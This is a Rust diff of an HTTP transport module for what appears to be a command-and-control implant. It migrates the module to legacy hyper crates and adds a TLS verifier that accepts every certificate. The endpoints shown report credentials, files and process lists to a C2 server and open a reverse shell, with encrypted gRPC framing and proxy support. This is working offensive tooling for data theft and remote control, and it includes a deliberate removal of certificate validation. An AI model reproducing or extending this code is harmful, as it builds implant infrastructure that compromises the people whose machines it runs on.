@@ -1,8 +1,8 @@
 use crate::Transport;
 use anyhow::{Context, Result};
 use bytes::BytesMut;
-use hyper::body::HttpBody;
-use hyper::StatusCode;
+use hyper_legacy::body::HttpBody;
+use hyper_legacy::{StatusCode, Uri};
 use pb::{c2::*, config::Config};
 use prost::Message;
 use std::sync::{
@@ -11,9 +11,9 @@ use std::sync::{
 };
 
 #[cfg(feature = "doh")]
-use crate::dns_resolver::doh::{DohProvider, HickoryResolverService};
+use crate::dns_resolver::doh::DohProvider;
 
-use hyper::Uri;
+use crate::tls_utils::legacy::AcceptAllCertVerifier;
 use std::str::FromStr;
 
 /// gRPC frame header utilities for encoding/decoding wire protocol frames
@@ -88,7 +88,7 @@ static FETCH_ASSET_PATH: &str = "/c2.C2/FetchAsset";
 static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
 static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
 static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
-static REPORT_TASK_OUTPUT_PATH: &str = "/c2.C2/ReportTaskOutput";
+static REPORT_OUTPUT_PATH: &str = "/c2.C2/ReportOutput";
 static _REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";
 
 // Marshal: Encode and encrypt a message using the ChachaCodec
@@ -114,27 +114,35 @@ where
 trait HttpClient: Send + Sync {
     fn request(
         &self,
-        req: hyper::Request<hyper::Body>,
+        req: hyper_legacy::Request<hyper_legacy::Body>,
     ) -> std::pin::Pin<
         Box<
-            dyn std::future::Future<Output = Result<hyper::Response<hyper::Body>, hyper::Error>>
-                + Send
+            dyn std::future::Future<
+                    Output = Result<
+                        hyper_legacy::Response<hyper_legacy::Body>,
+                        hyper_legacy::Error,
+                    >,
+                > + Send
                 + '_,
         >,
     >;
 }
 
-impl<C> HttpClient for hyper::Client<C>
+impl<C> HttpClient for hyper_legacy::Client<C>
 where
-    C: hyper::client::connect::Connect + Clone + Send + Sync + 'static,
+    C: hyper_legacy::client::connect::Connect + Clone + Send + Sync + 'static,
 {
     fn request(
         &self,
-        req: hyper::Request<hyper::Body>,
+        req: hyper_legacy::Request<hyper_legacy::Body>,
     ) -> std::pin::Pin<
         Box<
-            dyn std::future::Future<Output = Result<hyper::Response<hyper::Body>, hyper::Error>>
-                + Send
+            dyn std::future::Future<
+                    Output = Result<
+                        hyper_legacy::Response<hyper_legacy::Body>,
+                        hyper_legacy::Error,
+                    >,
+                > + Send
                 + '_,
         >,
     > {
@@ -159,15 +167,15 @@ impl std::fmt::Debug for HTTP {
 
 impl HTTP {
     /// Build URI from path
-    fn build_uri(&self, path: &str) -> Result<hyper::Uri> {
+    fn build_uri(&self, path: &str) -> Result<hyper_legacy::Uri> {
         let url = format!("{}{}", self.base_url, path);
         url.parse().context("Failed to parse URL")
     }
 
     /// Create a base HTTP request builder with common gRPC headers
-    fn request_builder(&self, uri: hyper::Uri) -> hyper::http::request::Builder {
-        hyper::Request::builder()
-            .method(hyper::Method::POST)
+    fn request_builder(&self, uri: hyper_legacy::Uri) -> hyper_legacy::http::request::Builder {
+        hyper_legacy::Request::builder()
+            .method(hyper_legacy::Method::POST)
             .uri(uri)
             .header("Content-Type", "application/grpc")
     }
@@ -175,8 +183,8 @@ impl HTTP {
     /// Send HTTP request and validate status code
     async fn send_and_validate(
         &self,
-        req: hyper::Request<hyper::Body>,
-    ) -> Result<hyper::Response<hyper::Body>> {
+        req: hyper_legacy::Request<hyper_legacy::Body>,
+    ) -> Result<hyper_legacy::Response<hyper_legacy::Body>> {
         let response = self
             .client
             .request(req)
@@ -191,8 +199,10 @@ impl HTTP {
     }
 
     /// Read entire response body
-    async fn read_response_body(response: hyper::Response<hyper::Body>) -> Result<bytes::Bytes> {
-        hyper::body::to_bytes(response.into_body())
+    async fn read_response_body(
+        response: hyper_legacy::Response<hyper_legacy::Body>,
+    ) -> Result<bytes::Bytes> {
+        hyper_legacy::body::to_bytes(response.into_body())
             .await
             .context("Failed to read response body")
     }
@@ -211,7 +221,7 @@ impl HTTP {
         let uri = self.build_uri(path)?;
         let req = self
             .request_builder(uri)
-            .body(hyper::Body::from(request_bytes))
+            .body(hyper_legacy::Body::from(request_bytes))
             .context("Failed to build HTTP request")?;
 
         let response = self.send_and_validate(req).await?;
@@ -226,7 +236,7 @@ impl HTTP {
     /// Stream and decode gRPC frames from HTTP response body (server-streaming pattern)
     /// Generic over request/response types for unmarshaling
     async fn stream_grpc_frames<Req, Resp, F>(
-        response: hyper::Response<hyper::Body>,
+        response: hyper_legacy::Response<hyper_legacy::Body>,
         mut handler: F,
     ) -> Result<()>
     where
@@ -293,12 +303,12 @@ impl HTTP {
     }
 
     /// Create a streaming HTTP body that encodes requests as gRPC frames (client-streaming pattern)
-    fn create_streaming_body<Req, Resp>(receiver: Receiver<Req>) -> hyper::Body
+    fn create_streaming_body<Req, Resp>(receiver: Receiver<Req>) -> hyper_legacy::Body
     where
         Req: Message + Send + 'static,
         Resp: Message + Default + Send + 'static,
     {
-        let (mut tx, body) = hyper::Body::channel();
+        let (mut tx, body) = hyper_legacy::Body::channel();
 
         tokio::spawn(async move {
             for req_chunk in receiver {
@@ -317,7 +327,9 @@ impl HTTP {
 
                 // Send frame header
                 if tx
-                    .send_data(hyper::body::Bytes::from(frame_header.encode().to_vec()))
+                    .send_data(hyper_legacy::body::Bytes::from(
+                        frame_header.encode().to_vec(),
+                    ))
                     .await
                     .is_err()
                 {
@@ -328,7 +340,7 @@ impl HTTP {
 
                 // Send encrypted chunk
                 if tx
-                    .send_data(hyper::body::Bytes::from(request_bytes))
+                    .send_data(hyper_legacy::body::Bytes::from(request_bytes))
                     .await
                     .is_err()
                 {
@@ -348,10 +360,10 @@ impl HTTP {
 
 impl Transport for HTTP {
     fn init() -> Self {
-        let mut connector = hyper::client::HttpConnector::new();
+        let mut connector = hyper_legacy::client::HttpConnector::new();
         connector.enforce_http(false);
         connector.set_nodelay(true);
-        let client = hyper::Client::builder().build(connector);
+        let client = hyper_legacy::Client::builder().build(connector);
         HTTP {
             client: Arc::new(client),
             base_url: String::new(),
@@ -360,7 +372,10 @@ impl Transport for HTTP {
 
     fn new(config: Config) -> Result<Self> {
         // Extract URI and EXTRA from config using helper functions
-        let callback = crate::transport::extract_uri_from_config(&config)?;
+        let c = crate::transport::extract_uri_from_config(&config)?;
+        let callback = c
+            .replace("http1s://", "https://")
+            .replace("http1://", "http://");
         let extra_map = crate::transport::extract_extra_from_config(&config);
 
         #[cfg(feature = "doh")]
@@ -380,7 +395,7 @@ impl Transport for HTTP {
         };
 
         #[cfg(not(feature = "doh"))]
-        let mut http = hyper::client::HttpConnector::new();
+        let mut http = hyper_legacy::client::HttpConnector::new();
 
         // Get proxy configuration from extra field
         let proxy_uri = extra_map.get("http_proxy");
@@ -389,24 +404,35 @@ impl Transport for HTTP {
         http.enforce_http(false); // Allow HTTPS
         http.set_nodelay(true); // TCP optimization
 
+        let tls_config = rustls_0_21::ClientConfig::builder()
+            .with_safe_defaults()
+            .with_custom_certificate_verifier(Arc::new(AcceptAllCertVerifier))
+            .with_no_client_auth();
+
+        let https = hyper_rustls_legacy::HttpsConnectorBuilder::new()
+            .with_tls_config(tls_config)
+            .https_or_http()
+            .enable_http1()
+            .wrap_connector(http);
+
         // Build the appropriate client based on configuration
         let client: Arc<dyn HttpClient> = match proxy_uri {
             Some(proxy_uri_string) => {
                 // Create proxy connector
-                let proxy = hyper_proxy::Proxy::new(
-                    hyper_proxy::Intercept::All,
+                let proxy = hyper_proxy_legacy::Proxy::new(
+                    hyper_proxy_legacy::Intercept::All,
                     Uri::from_str(proxy_uri_string.as_str())?,
                 );
-                let mut proxy_connector = hyper_proxy::ProxyConnector::from_proxy(http, proxy)?;
-                proxy_connector.set_tls(None);
+                let proxy_connector =
+                    hyper_proxy_legacy::ProxyConnector::from_proxy_unsecured(https, proxy);
 
                 // Build client with proxy
-                Arc::new(hyper::Client::builder().build(proxy_connector))
+                Arc::new(hyper_legacy::Client::builder().build(proxy_connector))
             }
             #[allow(non_snake_case) /* None is a reserved keyword */]
             None => {
                 // No proxy configuration
-                Arc::new(hyper::Client::builder().build(http))
+                Arc::new(hyper_legacy::Client::builder().build(https))
             }
         };
 
@@ -435,7 +461,7 @@ impl Transport for HTTP {
         let uri = self.build_uri(FETCH_ASSET_PATH)?;
         let req = self
             .request_builder(uri)
-            .body(hyper::Body::from(request_bytes))
+            .body(hyper_legacy::Body::from(request_bytes))
             .context("Failed to build HTTP request")?;
 
         let response = self.send_and_validate(req).await?;
@@ -497,11 +523,11 @@ impl Transport for HTTP {
         self.unary_rpc(request, REPORT_PROCESS_LIST_PATH).await
     }
 
-    async fn report_task_output(
+    async fn report_output(
         &mut self,
-        request: ReportTaskOutputRequest,
-    ) -> Result<ReportTaskOutputResponse> {
-        self.unary_rpc(request, REPORT_TASK_OUTPUT_PATH).await
+        request: ReportOutputRequest,
+    ) -> Result<ReportOutputResponse> {
+        self.unary_rpc(request, REPORT_OUTPUT_PATH).await
     }
 
     async fn reverse_shell(
@@ -713,7 +739,7 @@ mod tests {
         #[test]
         fn test_build_uri_success() {
             let http = HTTP {
-                client: Arc::new(hyper::Client::new()),
+                client: Arc::new(hyper_legacy::Client::new()),
                 base_url: "http://localhost:8080".to_string(),
             };
 
@@ -724,7 +750,7 @@ mod tests {
         #[test]
         fn test_build_uri_with_trailing_slash() {
             let http = HTTP {
-                client: Arc::new(hyper::Client::new()),
+                client: Arc::new(hyper_legacy::Client::new()),
                 base_url: "http://localhost:8080/".to_string(),
             };
 
@@ -735,7 +761,7 @@ mod tests {
         #[test]
         fn test_build_uri_without_leading_slash() {
             let http = HTTP {
-                client: Arc::new(hyper::Client::new()),
+                client: Arc::new(hyper_legacy::Client::new()),
                 base_url: "http://localhost:8080".to_string(),
             };
 
@@ -746,7 +772,7 @@ mod tests {
         #[test]
         fn test_build_uri_invalid() {
             let http = HTTP {
-                client: Arc::new(hyper::Client::new()),
+                client: Arc::new(hyper_legacy::Client::new()),
                 base_url: "not a valid url".to_string(),
             };
 
@@ -757,17 +783,17 @@ mod tests {
         #[test]
         fn test_request_builder_headers_and_method() {
             let http = HTTP {
-                client: Arc::new(hyper::Client::new()),
+                client: Arc::new(hyper_legacy::Client::new()),
                 base_url: "http://localhost".to_string(),
             };
 
             let uri = http.build_uri("/test").unwrap();
             let request = http
                 .request_builder(uri)
-                .body(hyper::Body::empty())
+                .body(hyper_legacy::Body::empty())
                 .unwrap();
 
-            assert_eq!(request.method(), hyper::Method::POST);
+            assert_eq!(request.method(), hyper_legacy::Method::POST);
             assert_eq!(
                 request.headers().get("content-type").unwrap(),
                 "application/grpc"
@@ -777,14 +803,14 @@ mod tests {
         #[test]
         fn test_request_builder_uri() {
             let http = HTTP {
-                client: Arc::new(hyper::Client::new()),
+                client: Arc::new(hyper_legacy::Client::new()),
                 base_url: "http://example.com".to_string(),
             };
 
             let uri = http.build_uri("/api/test").unwrap();
             let request = http
                 .request_builder(uri.clone())
-                .body(hyper::Body::empty())
+                .body(hyper_legacy::Body::empty())
                 .unwrap();
 
             assert_eq!(request.uri(), &uri);
